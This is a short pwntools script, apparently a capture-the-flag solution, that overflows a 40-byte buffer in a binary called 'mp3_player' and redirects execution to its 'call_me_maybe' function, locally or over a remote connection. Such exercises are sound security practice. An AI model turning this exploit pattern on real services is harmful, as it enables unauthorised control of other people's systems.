from pwn import *

context.arch = "amd64"
elf = ELF("./mp3_player", checksec=False)

if args.LOCAL:
    p = elf.process()
else:
    host = args.HOST or "localhost"
    port = int(args.PORT or 6100)
    p = remote(host, port)

offset = 40
ret_addr = elf.symbols["call_me_maybe"]

payload = b'A' * offset
payload += p64(ret_addr)

p.recvuntil(b"ABBA")
p.sendline(payload)
p.interactive()
